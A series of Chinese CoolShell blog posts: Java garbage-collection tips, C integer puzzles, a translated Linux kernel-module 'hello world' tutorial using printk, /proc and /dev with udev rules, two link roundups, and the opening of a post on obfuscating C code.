#### 四、引用置为null的传说早期的很多Java资料中都会提到在方法体中将一个变量置为null能够优化GC的性能，类似下面的代码：List<String> list = new ArrayList<String>();     // some code     list = null; // help GC事实上这种做法对GC的帮助微乎其微，有时候反而会导致代码混乱。我记得几年前 @rednaxelafx 在HLL VM小组中详细论述过这个问题，原帖我没找到，结论基本就是：* 在一个非常大的方法体内，对一个较大的对象，将其引用置为null，某种程度上可以帮助GC。   * 大部分情况下，这种行为都没有任何好处。所以，还是早点放弃这种“优化”方式吧。GC比我们想象的更聪明。#### 五、手动档的GC在很多Java资料上都有下面两个奇技淫巧：* 通过 **Thread.yield()** 让出CPU资源给其它线程。   * 通过 **System.gc()** 触发GC。事实上JVM从不保证这两件事，而System.gc()在JVM启动参数中如果允许显式GC，则会 **触发FullGC** ，对于响应敏感的应用来说，几乎等同于自杀。
So，让我们牢记两点：* Never use Thread.yield()。   * Never use System.gc()。除非你真的需要回收Native Memory。第二点有个Native Memory的例外，如果你在以下场景：* 使用了NIO或者NIO框架（Mina/Netty）   * 使用了DirectByteBuffer分配字节缓冲区   * 使用了MappedByteBuffer做内存映射由于 **Native Memory只能通过FullGC（或是CMS GC）回收** ，所以除非你非常清楚这时真的有必要，否则不要轻易调用System.gc()，且行且珍惜。另外为了防止某些框架中的System.gc调用（例如NIO框架、Java RMI），建议在启动参数中加上- XX:+DisableExplicitGC来禁用显式GC。这个参数有个巨大的坑，如果你禁用了System.gc()，那么上面的3种场景下的内存就无法回收，可能造成OOM，如果你使用了CMS GC，那么可以用这个参数替代：-XX:+ExplicitGCInvokesConcurrent。关于System.gc()，可以参考 @bluedavy 的几篇文章：
* CMS GC会不会回收Direct ByteBuffer的内存   * 说说在Java启动参数上我犯的错   * java.lang.OutOfMemoryError:Map failed#### 六、指定容器初始化大小Java容器的一个特点就是可以动态扩展，所以通常我们都不会去考虑初始大小的设置，不够了反正会自动扩容呗。但是扩容不意味着没有代价，甚至是很高的代价。例如一些基于数组的数据结构，例如StringBuilder、StringBuffer、ArrayList、HashMap等等，在扩容的时候都需要做ArrayCopy，对于不断增长的结构来说，经过若干次扩容，会存在大量无用的老数组，而回收这些数组的压力，全都会加在GC身上。这些容器的构造函数中通常都有一个可以指定大小的参数，如果对于某些大小可以预估的容器，建议加上这个参数。可是因为容器的扩容并不是等到容器满了才扩容，而是有一定的比例，例如HashMap的扩容阈值和负载因子(loadFactor)相关。Google Guava框架对于容器的初始容量提供了非常便捷的工具方法，例如：[code lang=”java”]Lists.newArrayListWithCapacity(initialArraySize);
Lists.newArrayListWithExpectedSize(estimatedSize);Sets.newHashSetWithExpectedSize(expectedSize);Maps.newHashMapWithExpectedSize(expectedSize);   [/code]这样我们只要传入预估的大小即可，容量的计算就交给Guava来做吧。**反例** ：如果采用默认无参构造函数，创建一个ArrayList，不断增加元素直到OOM，那么在此过程中会导致：* 多次数组扩容，重新分配更大空间的数组   * 多次数组拷贝   * 内存碎片#### 七、对象池为了减少对象分配开销，提高性能，可能有人会采取对象池的方式来缓存对象集合，作为复用的手段。但是对象池中的对象由于在运行期长期存活，大部分会晋升到Old Generation，因此无法通过YoungGC回收。并且通常……没有什么效果。对于对象本身：* 如果对象很小，那么分配的开销本来就小，对象池只会增加代码复杂度。   * 如果对象比较大，那么晋升到Old Generation后，对GC的压力就更大了。从线程安全的角度考虑，通常池都是会被并发访问的，那么你就需要处理好同步的问题，这又是一个大坑，并且 **同步带来的开销，未必比你重新创建一个对象小** 。
对于对象池，唯一合适的场景就是 **当池中的每个对象的创建开销很大** 时，缓存复用才有意义，例如每次new都会创建一个连接，或是依赖一次RPC。比如说：* 线程池   * 数据库连接池   * TCP连接池即使你真的需要实现一个对象池，也请使用成熟的开源框架，例如Apache Commons Pool。另外，使用JDK的ThreadPoolExecutor作为线程池，不要重复造轮子，除非当你看过AQS的源码后认为你可以写得比Doug Lea更好。#### 八、对象作用域尽可能缩小对象的作用域，即生命周期。* 如果可以在方法内声明的局部变量，就不要声明为实例变量。   * 除非你的对象是单例的或不变的，否则尽可能少地声明static变量。#### 九、各类引用java.lang.ref.Reference有几个子类，用于处理和GC相关的引用。JVM的引用类型简单来说有几种：* Strong Reference，最常见的引用   * Weak Reference，当没有指向它的强引用时会被GC回收   * Soft Reference，只当临近OOM时才会被GC回收   * Phantom Reference，主要用于识别对象被GC的时机，通常用于做一些清理工作
当你需要实现一个缓存时，可以考虑优先使用WeakHashMap，而不是HashMap，当然，更好的选择是使用框架，例如Guava Cache。最后，再次提醒，以上的这些未必可以对代码有多少性能上的提升，但是熟悉这些方法，是为了帮助我们写出更卓越的代码，和GC更好地合作。（全文完）# 《Vim Recipes》免费的Vim Cookbook作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn当今最流行的文本编辑器是什么，如果我的回答是vim应该不算过份吧。在 http://vim.runpaint.org/ 你可以获得一本关于vim的cookbook 《Vim Recipes》如果你非常喜欢vim编辑器，千万不要错过这本书，使用这本书，你将会发现你在vim遇到问题都可以迎刃而解。此书还在更新过程中，更多内容请关注# C 语言整型谜题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn如题，此篇文章是描述C语言中的整数谜题。假定机器字长是32位的，用2的补码表示整数。对以下C表达式，请问它们在所有情况下都正确吗？如果不是，请给出反例。
初始化：int x = foo();     int y = bar();     unsigned ux = x;     unsigned uy = y;1\. 若x < 0, 则x * 2 < 02\. ux >= 03\. 若x & 7 == 7， 则(x << 30) < 04\. ux > -15\. 若x > y, 则-x < -y6\. x * x >= 07\. 若x > 0 && y > 0, 则x + y > 08\. 若x >= 0, 则-x <= 09\. 若x <= 0, 则-x >= 0答案如下：1\. 错。当x = INT_MIN2\. 正确。3\. 正确。4\. 错。-1被转换成UINT_MAX5\. 错。当x = -1, y = INT_MIN6\. 错。当x = 655357\. 错。INT_MAX 和 INT_MAX8\. 正确。9\. 错。INT_MIN# Linux设备驱动Hello World程序介绍作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnby Valerie Henson   07/05/2007
( **译者注：本文的例子是只能在linux的2.6内核下使用的，2.6以上的内核，译者没有做过实验，2.4是要修改make文件才能运行** 。)本文的出处：这里自古以来，学习一门新编程语言的第一步就是写一个打印“hello world”的程序（可以看《hello world 集中营》这个帖子供罗列了300个“hello world”程序例子）在本文中，我们将用同样的方式学习如何编写一个简单的linux内核模块和设备驱动程序。我将学习到如何在内核模式下以三种不同的方式来打印hello world，这三种方式分别是： printk()，/proc文件，/dev下的设备文件。目录* 准备：安装内核模块的编译环境   * 使用printk()函数打印”Hello World”   * 使用/proc的Hello, World!   * Hello, World! 使用 /dev/hello_world#### 准备：安装内核模块的编译环境一个内核模块kernel module是一段能被内核动态加载和卸载的内核代码，因为内核模块程序是内核的一个部分，并且和内核紧密的交互，所以内核模块不可能脱离内核编译环境，至少，它需要内核的头文件和用于加载的配置信息。编译内核模块同样需要相关的开发工具，比如说编译器。为了简化，本文只简要讨论如何在Debian、Fedora和其他以.tar.gz形式提供的原版linux内核下进行核模块的编译。在这种情况下，你必须根据你正在运行内核相对应的内核源代码来编译你的内核模块kernel module(当你的内核模块一旦被装载到你内核中时，内核就将执行该模块的代码)
必须要注意内核源代码的位置，权限：内核程序通常在/usr/src/linux目录下，并且属主是root。如今，推荐的方式是将内核程序放在一个非root用户的home目录下。本文中所有命令都运行在非root的用户下，只有在必要的时候，才使用sudo来获得临时的root权限。配置和使用sudo可以man sudo(8) visudo(8) 和sudoers(5)。或者切换到root用户下执行相关的命令。不管什么方式，你都需要root权限才能执行本文中的一些命令。在Debian下编译内核模块的准备使用如下的命令安装和配置用于在Debian编译内核模块的module-assitant包$ sudo apt-get install module-assistant以此你就可以开始编译内核模块，你可以在《Debian Linux Kernel Handbook》这本书中找到对Debian内核相关任务的更深度的讨论。Fedora的kernel-devel包包含了你编译Fedora内核模块的所有必要内核头文件和工具。你可以通过如下命令得到这个包。`$ sudo yum install kernel-devel`
有了这个包，你就可以编译你的内核模块kernel modules。关于Fedora编译内核模块的相关文档你可以从Fedora release notes中找到。一般Linux 内核源代码和配置(译者注，下面的编译很复杂，如果你的Linux不是上面的系统，你可以使用REHL AS4系统，这个系统的内核就是2.6的内核，并且可以通过安装直接安装内核编译支持环境，从而就省下了如下的步骤。而且下面的步骤比较复杂，建议在虚拟机安装Linux进行实验。)如果你选择使用一般的Linux内核源代吗，你必须，配置，编译，安装和重启的你编译内核。这个过程非常复杂，并且本文只会讨论使用一般内核源代码的基本概念。linux的著名的内核源代码在http://kernel.org上都可以找到。最近新发布的稳定版本的代码在首页上。下载全版本的源代码，不要下载补丁代码。例如，当前发布稳定版本在url: http://kernel.org/pub/linux/kernel/v2.6/linux-2.6.21.5.tar.bz2上。如果需要更快速的下载，从htpp://kernel.org/mirrors上找到最近的镜像进行下载。最简单获得源代码的方式是以断点续传的方式使用wget。如今的http很少发生中断，但是如果你在下载过程中发生了中断，这个命令将帮助你继续下载剩下的部分。
`$ wget -c http://kernel.org/pub/linux/kernel/v2.6/linux-2.6.21.5.tar.bz2 `解包内核源代码`$ tar xjvf linux-<version>.tar.bz2`现在你的内核源代码位于linux-/目录下。转到这个目录下，并配置它：$ cd linux-<version>     $ make menuconfig一些非常易用的编译目标make targets提供了多种编译安装内核的形式：Debian 包，RPM包，gzip后的tar文件 等等，使用如下命令查看所有可以编译的目标形式`$ make help`一个可以工作在任何linux的目标是：(译者注：REHL AS4上没有tar- pkg这个目标，你可以任选一个rpm编译，编译完后再上层目录可以看到有一个linux-.tar.gz可以使用)`$ make tar-pkg`当编译完成后，可以调用如下命令安装你的内核`$ sudo tar -C / -xvf linux-<version>.tar`在标准位置建立的到内核源代码的链接`$ sudo ln -s <location of top-level source directory> /lib/modules/'uname -r'/build`
现在已经内核源代码已经可以用于编译内核模块了，重启你的机器以使得你根据新内核程序编译的内核可以被装载。#### 使用printk()函数打印”Hello World”我们的第一个内核模块，我们将以一个在内核中使用函数printk()打印”Hello world”的内核模块为开始。printk是内核中的printf函数。printk的输出打印在内核的消息缓存kernel message buffer并拷贝到/var/log/messages(关于拷贝的变化依赖于如何配置syslogd)下载hello_printk 模块的tar包 并解包：`$ tar xzvf hello_printk.tar.gz`这个包中包含两个文件:Makefile，里面包含如何创建内核模块的指令和一个包含内核模块源代码的hello_printk.c文件。首先，我们将简要的过一下这个Makefile 文件。`obj-m := hello_printk.o`obj-m指出将要编译成的内核模块列表。.o格式文件会自动地有相应的.c文件生成(不需要显示的罗列所有源代码文件)KDIR  := /lib/modules/$(shell uname -r)/build
KDIR表示是内核源代码的位置。在当前标准情况是链接到包含着正在使用内核对应源代码的目录树位置。PWD := $(shell pwd)PWD指示了当前工作目录并且是我们自己内核模块的源代码位置default:     $(MAKE) -C $(KDIR) M=$(PWD) modulesdefault是默认的编译连接目标；即，make将默认执行本条规则编译目标，除非程序员显示的指明编译其他目标。这里的的编译规则的意思是，在包含内核源代码位置的地方进行make,然后之编译$(PWD)(当前)目录下的modules。这里允许我们使用所有定义在内核源代码树下的所有规则来编译我们的内核模块。现在我们来看看hello_printk.c这个文件这里包含了内核提供的所有内核模块都需要的头文件。这个文件中包含了类似module_init()宏的定义，这个宏稍后我们将用到这是内核模块的初始化函数，这个函数在内核模块初始化被装载的时候调用。__init关键字告诉内核这个代码只会被运行一次，而且是在内核装载的时候。printk()函数这一行将打印一个”Hello, world”到内核消息缓存。printk参数的形式在大多数情况和printf(3)一模一样。
module_init(hello_init);     module_init()宏告诉内核当内核模块第一次运行时哪一个函数将被运行。任何在内核模块中其他部分都会受到内核模块初始化函数的影响。同样地，退出函数也只在内核模块被卸载的时候会运行一次，module_exit()宏标示了退出函数。__exit关键字告诉内核这段代码只在内核模块被卸载的时候运行一次。MODULE_LICENSE("GPL");     MODULE_AUTHOR("Valerie Henson [[email protected]](/cdn-cgi/l/email-protection)");     MODULE_DESCRIPTION("Hello, world!" minimal module");     MODULE_VERSION("printk");     MODULE_LICENSE()宏告诉内核，内核模块代码在什么样的license之下，这将影响主那些符号(函数和变量，等等)可以访问主内核。GPLv2 下的模块(如同本例子中)能访问所有的符号。某些内核模块license将会损害内核开源的特性，这些license指示内核将装载一些非公开或不受信的代码。如果内核模块不使用MODULE_LICENSE()宏，就被假定为非GPLv2的，这会损害内核的开源特性，并且大部分Linux内核开发人员都会忽略来自受损内核的bug报告，因为他们无法访问所有的源代码，这使得调试变得更加困难。剩下的MODULE_*()这些宏以标准格式提供有用的标示该内核模块的信息(译者注：这里意思是，你必须使用GPLv2的license，否则你的驱动程序很有可能得不到Linux社区的开发者的支持 ：）)
现在，开始编译和运行代码。转到相应的目录下，编译内核模块$ cd hello_printk     $ make接着，装载内核模块，使用insmod指令，并且通过dmesg来检查打印出的信息，dmesg是打印内核消息缓存的程序。$ sudo insmod ./hello_printk.ko     $ dmesg | tail你将从dmesg的屏幕输出中看见”Hello world!”信息。现在卸载使用rmmod卸载内核模块，并检查退出信息。$ sudo rmmod hello_printk     $ dmesg | tail到此，你就成功地完成了对内核模块的编译和安装！#### 使用/proc的Hello, World!一种用户程序和内核通讯最简单和流行的方式是通过使用/proc下文件系统进行通讯。/proc是一个伪文件系统，从这里的文件读取的数据是由内核返回的数据，并且写入到这里面的数据将会被内核读取和处理。在使用/proc方式之前，所用用户和内核之间的通讯都不得不使用系统调用来完成。使用系统调用意味着你将在要在查找已经具有你需要的行为方式的系统调用(一般不会出现这种情况)，或者创建一种新的系统调用来满足你的需求(这样就要求对内核全局做修改，并增加系统调用的数量，这是通常是非常不好的做法)，或者使用ioctl这个万能系统调用，这就要求要创建一个新文件类型供ioctl操作(这也是非常复杂而且bug比较多的方式，同样是非常繁琐的)。/proc提供了一个简单的，无需定义的方式在用户空间和内核之间传递数据，这种方式不仅可以满足内核使用，同样也提供足够的自由度给内核模块做他们需要做的事情。
为了满足我们的要求，我们需要当我们读在/proc下的某一个文件时将会返回一个“Hello world!”。我们将使用/proc/hello_world这个文件。下载并解开hello proc这个gzip的tar包后，我们将首先来看一下hello_proc.c这个文件这次，我们将增加一个proc_fs头文件，这个头文件包括驱动注册到/proc文件系统的支持。当另外一个进程调用read()时，下一个函数将会被调用。这个函数的实现比一个完整的普通内核驱动的read系统调用实现要简单的多，因为我们仅做了让”Hello world”这个字符串缓存被一次读完。这个函数的参数值得明确的解释一下。buffer是指向内核缓存的指针，我们将把read输出的内容写到这个buffer中。start参数多用更复杂的/proc文件；我们在这里将忽略这个参数；并且我只明确的允许offset这个的值为0。size是指buffer中包含多字节数；我们必须检查这个参数已避免出现内存越界的情况，eof参数一个EOF的简写，用于返回文件是否已经读到结束，而不需要通过调用read返回0来判断文件是否结束。这里我们不讨论依靠更复杂的/proc文件传输数据的方法。这个函数方法体罗列如下：
char *hello_str = "Hello, world!\n";     int len = strlen(hello_str); /* Don't include the null byte. */     /*     * We only support reading the whole string at once.     */     if (size < len)     return< -EINVAL;     /*     * If file position is non-zero, then assume the string has     * been read and indicate there is no more data to be read.     */     if (offset != 0)     return 0;     /*     * We know the buffer is big enough to hold the string.     */     strcpy(buffer, hello_str);     /*     * Signal EOF.     */     *eof = 1;     return len;     }
下面，我们需将内核模块在初始化函数注册在/proc 子系统中。当内核模块卸载时，需要在/proc移出注册的信息(如果我们不这样做的，当一个进程试图去访问/proc/hello_world，/proc文件系统将会试着执行一个已经不存在的功能，这样将会导致内核崩溃)static void __exit     hello_exit(void){     remove_proc_entry("hello_world", NULL);     }     module_exit(hello_exit);     MODULE_LICENSE("GPL");     MODULE_AUTHOR("Valerie Henson [[email protected]](/cdn-cgi/l/email-protection)");     MODULE_DESCRIPTION(""Hello, world!" minimal module");     MODULE_VERSION("proc");下面我们将准备编译和装载模组$ cd hello_proc     $ make     $ sudo insmod ./hello_proc.ko
现在，将会有一个称为/proc/hello_world的文件，并且读这个文件的，将会返回一个”Hello world”字符串。$ cat /proc/hello_world     Hello, world!你可以为为同一个驱动程序创建多个/proc文件，并增加相应写/proc文件的函数，创建包含多个/proc文件的目录，或者更多的其他操作。如果要写比这个更复杂的驱动程序，可以使用seq_file函数集来编写是更安全和容易的。关于这些更多的信息可以看《Driver porting: The seq_file interface》#### Hello, World! 使用 /dev/hello_world现在我们将使用在/dev目录下的一个设备文件/dev/hello_world实现”Hello,world!” 。追述以前的日子，设备文件是通过MAKEDEV脚本调用mknod命令在/dev目录下产生的一个特定的文件，这个文件和设备是否运行在改机器上无关。到后来设备文件使用了devfs，devfs在设备第一被访问的时候创建/dev文件，这样将会导致很多有趣的加锁问题和多次打开设备文件的检查设备是否存在的重试问题。当前的/dev版本支持被称为udev，因为他将在用户程序空间创建到/dev的符号连接。当内核模块注册设备时，他们将出现在sysfs文件系统中，并mount在/sys下。一个用户空间的程序，udev,注意到/sys下的改变将会根据在/etc/udev/下的一些规则在/dev下创建相关的文件项。
下载hello world内核模块的gzip的tar包，我们将开始先看一下hello_dev.c这个源文件。正如我们看到的必须的头文件外，创建一个新设备还需要更多的内核头文件支持。fs.sh包含所有文件操作的结构，这些结构将由设备驱动程序来填值，并关联到我们相关的/dev文件。miscdevice.h头文件包含了对通用miscellaneous设备文件注册的支持。 asm/uaccess.h包含了测试我们是否违背访问权限读写用户内存空间的函数。hello_read将在其他进程在/dev/hello调用read()函数被调用的是一个函数。他将输出”Hello world!”到由read()传入的缓存。下一步，我们创建一个文件操作结构file operations struct，并用这个结构来定义当文件被访问时执行什么动作。在我们的例子中我们唯一关注的文件操作就是read。现在，我们将创建一个结构，这个结构包含有用于在内核注册一个通用miscellaneous驱动程序的信息。在通常情况下，我们在init中注册设备接下是在卸载时的退出函数static void __exit     hello_exit(void){     misc_deregister(&hello_dev);     }     module_exit(hello_exit);     MODULE_LICENSE("GPL");     MODULE_AUTHOR("Valerie Henson [[email protected]](/cdn-cgi/l/email-protection)>");     MODULE_DESCRIPTION(""Hello, world!" minimal module");     MODULE_VERSION("dev");
编译并加载模块:$ cd hello_dev     $ make     $ sudo insmod ./hello_dev.ko现在我们将有一个称为/dev/hello的设备文件，并且这个设备文件被root访问时将会产生一个”Hello, world!”$ sudo cat /dev/hello     Hello, world!但是我们不能使用普通用户访问他:$ cat /dev/hello     cat:/dev/hello: Permission denied$ ls -l     /dev/hello crw-rw---- 1 root root 10, 61 2007-06-20 14:31 /dev/hello这是有默认的udev规则导致的，这个条规将标明当一个普通设备出现时，他的名字将会是/dev/，并且默认的访问权限是0660(用户和组读写访问，其他用户无法访问)。我们在真实情况中可能会希望创建一个被普通用户访问的设备驱动程序，并且给这个设备起一个相应的连接名。为达到这个目的，我们将编写一条udev规则。udev规则必须做两件事情：第一创建一个符号连接，第二修改设备的访问权限。
下面这条规则可以达到这个目的：`KERNEL=="hello", SYMLINK+="hello_world", MODE="0444"`我们将详细的分解这条规则，并解释每一个部分。KERNEL==”hello” 标示下面的的规则将作用于/sys中设备名字”hello”的设备(==是比较符)。hello 设备是我们通过调用misc_register()并传递了一个包含设备名为”hello”的文件操作结构file_operations为参数而达到的。你可以自己通过如下的命令在/sys下查看$ ls -d /sys/class/misc/hello//sys/class/misc/hello/SYMLINK+=”hello_world” 的意思是在符号链接列表中增加 (+= 符号的意思着追加)一个hello_world ，这个符号连接在设备出现时创建。在我们场景下，我们知道我们的列表的中的只有这个符号连接，但是其他设备驱动程序可能会存在多个不同的符号连接，因此使用将设备追加入到符号列表中，而不是覆盖列表将会是更好的实践中的做法。MODE=”0444″的意思是原始的设备的访问权限是0444,这个权限允许用户，组，和其他用户可以访问。
通常，使用正确的操作符号(==, +=, or =)是非常重要的，否则将会出现不可预知的情况。现在我们理解这个规则是怎么工作的，让我们将其安装在/etc/udev目录下。udev规则文件以和System V初始脚本目录命名的同种方式的目录下，/etc/udeve/rules.d这个目录，并以字母/数字的顺序。和System V的初始化脚本一样，/etc/udev/rules.d下的目录通常符号连接到真正的文件，通过使用符号连接名，将使得规则文件已正确的次序得到执行。   使用如下的命令，拷贝hello.rules文件从/hello_dev目录到/etc/udev目录下，并创建一一个最先被执行的规则文件链接在/etc/udev/rules.d目录下。$ sudo cp hello.rules /etc/udev/     $ sudo ln -s ../hello.rules /etc/udev/rules.d/010_hello.rules现在我们重新装载驱动程序，并观察新的驱动程序项$ sudo rmmod hello_dev     $ sudo insmod ./hello_dev.ko     $ ls -l /dev/hello*     cr--r--r-- 1 root root 10, 61 2007-06-19 21:21 /dev/hello     lrwxrwxrwx 1 root root      5 2007-06-19 21:21 /dev/hello_world -> hello
最后，检查你可以使用普通用户访问/dev/hello_world设备.$ cat /dev/hello_world     Hello, world!$ cat /dev/hello     Hello, world!更多编写udev规则的信息可以在Daniel Drake的文章Writing udev rules中找到。# 一些有意思的网站和贴子作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn各位朋友，又到了介绍各种杂项的时候了，正如以前的这篇和这篇文章一样，本篇文章也给你介绍一些最近出现的一些有趣的东西。希望你能喜欢。* 首先是华尔街的一篇报道，2011年最好和最不好的工作，其引用了CareerCast.com的数据，其列出了100个工作种类，并根据薪资、工作环境、工作鸭梨、体力消耗和就业前景做了一个排序。结果 **排第一位的是“软件工程师”** ，其理由是：高科技产品的需求呈爆炸式增长，以及人们对iPod、平板电脑、和其它科技产品应用软件的喜好，软件工程师被评为最佳职业。软件工程师有弹性工作时间，可以在家办公，而且每个月都有猎头找来。而最差是的则是码头工人。
[![\[bestjobspromo\]](http://si.wsj.net/public/resources/images/OB- LP754_bestjo_D_20110104181820.jpg)](http://online.wsj.com/public/resources/documents/st_BESTJOBS0104_20110105.html)* 接下来是一个叫“Java pass by value”的长贴，楼主说有一天在LinkedIn.com上看到了Java Group里有人讨论Java是pass by value的，长达240+贴子。贴子里说，如果你使用Java的原始类型如int, long，就是传值，如果你用object, array，其实传的是一个引用的拷贝，所以，Java是传值的。呵呵，你觉得有道理吗？于是，成就了这个大讨论战。reddit.com上也有N多的回贴。有空可以看看。* 然后是两个网站，不知道你是否还记得我们介绍的那个Windows 3.1的Web网站，用Web来实现一切看来是迟早的问题。下面，让我们来看两个网站：      * 第一个是仿MS-DOS的个人网站——
*     * 第二个是仿iPad的网站——如果以后的上网设备必然是以移动为主，那么Web开发中的HTML+ Javascript将有可能成为最所有应用都需要去支持的东西。* 说到Web开发，表单提交功能是每个网站都会最到的事情。这里有一篇文章告诉你了如何增强表单的可用性。非常不错，Web程序员可以前往一读：* 接下来，向大家介绍一个开源项目——TeleHash，其基于Kademlia在DHT网络上以P2P的方式用UDP协议来发送一些JSON数据。于是你的应用程序就可以使用这个库来开发你的应用了。其源码在：，它的口号是：JSON + UDP + DHT = Freedom* 如果你想使用autotools（autoconf和automake）写Makefile，这里有一个非常不错的教程：* 不知道大家知不知道微软xbox 360上的Kinect？其是XBox的一个硬件插件，有点类似于Wii，不过它的强大之处在于，你只需要用你的肢体动作就可以玩游戏了，不需要手上拿个什么。现在，几乎全世界的程序员都在hack这个东东，有人还用他玩WoW，也是强大。这里有一个教程教你如何通过openkinect.org和C#开发点自己的小玩意。
* 相试着写一个最简单的操作系统吗？这里有一篇教程教你用x86的汇编做一个操作系统，如果你想走得更远，可以看看MikeOS project。* 下面是一个HTML5 Canvas Cheat Sheet（点击看大图），关于更多的Cheat Sheet，你可以看看《程序员小抄大全》《25个jQuery的编程小抄》!HTML5 Canvas Cheat SheetHTML5 Canvas Cheat Sheet* Mono开始支持Android。Mono是一个由Novell公司（先前是Ximian）主持的项目。该项目的目标是创建一系列符合ECMA标准（Ecma-334和Ecma-335）的.NET工具，包括C#编译器和共通語言執行平臺。与微软的.NET Framework不同，Mono项目不仅可以运行于Windows系统上，还可以运行于Linux，FreeBSD，Unix，Mac OS X和Solaris。这个项目叫MonoDroid。* 最后来一个给力的教程吧，这是一个关于教你如何制作一个3D的LED显示的教程，相当的详细，甚至教你如何上ebay采购相关的电子元件和设备，还有如何编程，有兴趣的朋友可以一读。
!Led Cube 8x8x8这回就这么多，希望你喜欢。# 一些有意思的贴子和工具作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn又到了介绍各种杂项的时候了，正如以前的这三篇（这篇，这篇，和这篇）文章一样，本篇文章也给你介绍一些最近出现的一些有趣的东西。希望你能喜欢。先说找工作吧，电影《该页无法显示》里的那个facebook主页上的 **招聘网页** 上是列了一堆问题，你可以去看看，你可以使用c/c++，Erlang，Haskell，Java，Perl，Python，PHP，Ruby来解题，不过只接受Unix/Linux下的版本， 不接受Windows的版本。无独有偶，DropBox的 **招聘网页** 上也是些算法题，大家可以过去看看，不过需要翻墙。（现在，对于美国互联网企业来说，如果你没有被C2C，说明你根本不存在，如果你没有被墙，说明你还不算成功）接下来给大家介绍一些文档和教程吧，都是英文的。* **Java和C#的完整比较** 。这是一个相当完整的比较Java和C#语言的网页。很有意思，有助于你了解Java和C#的各种特性和不同。* **SQL 性能调优** 。这个文档覆盖了 _IBM DB2_ , _MySQL_ , _Oracle_ , _PostgreSQL_ 和 _Microsoft SQL Server_ 。不过这个电子书还没有写完，你可以使用其RSS, twitter 或 Facebook 来跟踪其进度。
* **Clever Algorithms** 。这个电子书也是免费的。其主要面向一些AI和面向自然的算法，一共45个。其包括概率随机算法，迭代进化算法，物理算法，可能性算法，蚂蚁蜜蜂式算法，免疫算法，神经算法等。里面大量的高等数学公式对我来说我已经看不懂了。不过，我相信这个电子书非常适合搞理论研究的人，或是需要抄袭一篇论文以顺利毕业的人使用。* **HTML5 Audio& Video 处理**。这是一组在线的幻灯片，请使用键盘光标键翻页。这是一组带着各种演示的幻灯片，对于你要学习HTML5的声音和视频相关的知识很有帮助。* **C 语言的宏** 。你想知道C语的宏有哪些有些意思的用法吗？这篇文档不会让你失望的。其由浅入深地向你介绍了宏的各种用法。* **各种语言的排序算法** 。你想知道各种语言其默认的排序算法用的是哪种排序算法吗？看看这篇文章吧。* **物理模拟F#教程** 。相信你一定玩过那种游戏，画一个任意形状的石头，其会从天上落下以砸下面的一个东西，这个教程用.NET的F#向大家说明了这种东西怎么去做。（演示程序）* **Sin& Cos游戏教程**。这篇文章向你介绍了一些游戏编程的技术。
* **GNOME开发介绍** 。这是一个非官方的介绍GNOME应用开发的教程，简单清楚，很适合初学者。* **10分钟学会Python** 。是的，也许你和我一样，很恨这样几天就学好一门语言的书，比如：21天学好C++。这个更夸张，10分钟。TNND。不过，当我看了一下后，我觉得其很适合初学者对Python有一个感性的认识。* **CSS阴影教程** 。这是一篇教你种CSS做出种式样式的阴影效果的教程，这里是演示。* **用Haskell开发iPhone应用** 。这是一个教程序，告诉你如何用Haskell开发iOS的应用程序。下面，再让我给你介绍一些和Web开发相关的开源的库。* **Photon** 。这是一个号称高性能的轻量级的PHP应用服务器框架。号称比Zend，Symfony和mod_php快3-10倍。* **ChemDoodle** 。这是一个用来画一些化学分子式的基于HTML5的类库和API，支持2D/3D，很强大。兼容于所有产商的支持HTML5的浏览器。* **LimeJS** 。这个JS库可以让你方便得制作一些触摸屏的小游戏。演示一，演示二。（一些游戏相关的JS）* **拼写检查** 。这是一个英文拼写检查的JS。
* **Pattern** 。这是东东很强大，用于做Web挖掘，其有一组工具用来从Google, Twitter, Wikipedia，Web爬虫，HTML上获得数据，并进行文本分析和数据图形化显示。你可以上这里看看相关演示。* **Titanium Mobile** 。你想让你的代码同时支持iPhone和Android吗？这是一个跨平台的开发工具。这里有一个教程。* **CSS3的按钮** 。这里可以去下载一个CSS3的库，里面有N多的按钮风格，感觉都很酷。接下来，介绍一些小工具。* **Web兼容性表** 。你想看看各种浏览器对HTML5，CSS3，SVG的支持吗？这个网站可以让你看到所有的主流浏览器的兼容表。* **qgrep** 。嫌grep不够快吗？试试qgrep吧，支持OSX, Linux 和 Windows。* **XKeymacs** 。你有Emacs情结吗？如果有的话，试试这个工具吧，在windows里到处c-x c-c, c-x c-s, c-p, c-n什么什么的。挺有意思的。好吧，不是有意思，是BT。* **Sublime Text 2** 。虽然目前只是Alpha版本，但是这个看上去真的很不错。尤其是用来查看代码。支持Windows, Linux和OSX。
* **VS-Android** 。这个项目让你可以在Visual Studio 2010的IDE下开发Android NDK C/C++的程序。其它东西。* **脚本语言排名** 。这个网页不但对所有的脚本语言进行了排名，还对一些操作进行了比较。* HTML5的3D演示，这里有几个HTML5的3D演示，你可以看看，演示一，演示二，演示三，演示四。* 说到Web上的3D，你可能需要看看Adobe的Molehill (3D GPU accelerated) APIs，这里有一篇介绍文章。* 还记得那个流体力学的演示吗？现在有人把其做到了iPhone/iPad上。就这么多吧，也许没什么意思，那也请你见谅了。（全文完）# 如何加密/混乱C源代码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn之前发表了《 **6个变态的C语言Hello World程序** 》[酷壳链接] [CSDN链接]，主要是是像大家展示了一些C语言的变态玩法。也向大家展示了一下程序是可以写得让人看不懂的，在那篇文章中，可以看到很多人的留言，很多人都觉得很好玩，是的，那本来是用来供朋友们“消遣作乐”，供娱乐娱东而已，不必太过认真。
